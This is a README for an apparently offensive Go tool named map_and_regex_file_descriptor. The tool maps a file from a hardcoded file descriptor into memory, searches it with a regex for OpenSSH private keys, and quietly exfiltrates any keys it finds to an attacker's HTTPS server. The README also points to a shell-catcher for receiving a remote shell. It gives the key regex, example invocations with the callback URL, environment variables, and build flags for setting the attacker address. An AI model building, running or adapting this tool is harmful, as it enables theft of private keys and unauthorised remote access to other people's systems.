Map and Regex File Descriptor
=============================
Nearly the same as [`read_from_file_descriptor`](../read_from_file_descriptor)
but maps a file descriptor number's file into memory and exfills regular
expression matches.

The file descriptor number is hardcoded to 8.

A crude shell-catcher may be found in the
[`letsencryptshellcatcher`](../letsencryptshellcatcher) directory.
Run it with `-https /somepath`, and put the same `/somepath` in the server
URL.

Regex Exfil
-----------
The file pointed by file descriptor 8 will be mapped into memory and searched
for SSH keys with the following regex:
```
`-----BEGIN OPENSSH PRIVATE KEY-----` +
	`[ -~\r\n\t]{10,1000}?` +
	`[ -~\r\n\t]{10,1000}?` +
	`[ -~\r\n\t]{10,1000}?` +
	`[ -~\r\n\t]{10,1000}?` +
	`-----END OPENSSH PRIVATE KEY-----`,
```
Found keys are exfilled.  This happens in the background, leaving the shell
usable while the search happens.

URL File Descriptor
-------------------
The URL may be read file descriptor 7, and overrides the environment variable.

### Examples
Set the address via a heredoc:
```sh
./map_and_regex_file_descriptor 7<<_eof
https://localhost:5555/somepath
_eof
```

Set just the address via bash's Here String:
```sh
./bin/map_and_regex_file_descriptor 7<<<"https://localhost:5555/somepath"
```

Environment Variables
---------------------
The URL may be set with environment variables, overriding
compile-time settings, as follows

Default Variable        | Description
------------------------|------------
`ALPT4ATS_ADDRESS`      | HTTPS Server URL
`ALPT4ATS_REAL_ADDRESS` | Optional HTTPS Server IP:Port

The variable names may be changed at compile-time, as below.

Compile-time Config
-------------------
Compile time configuration is possible with the linker's `-X` (as in 
`go build -ldflags '-X main.Foo=bar'`).  The variables are as follows

Variable                                                           | Default                        | Description
-------------------------------------------------------------------|--------------------------------|------------
[`main.Address`](./map_and_regex_file_descriptor.go#L30)           | `https://localhost:4444/shell` | HTTPS Server URL
[`main.AddressEnvVar`](./map_and_regex_file_descriptor.go#L31)     | `ALPT4ATS_ADDRESS`             | Environment variable which sets the HTTPS Server URL
[`main.RealAddressEnvVar`](./map_and_regex_file_descriptor.go#L32) | `ALPT4ATS_REAL_ADDRESS`        | Environment variable which sets the server's real IP address and port

When building with the [Makefile](../../Makefile) these may be passed in with
the `LINKFLAGS` environment variable, as in
```sh
LINKFLAGS="-X main.Address=https://example.com:8080/notshell" make
```
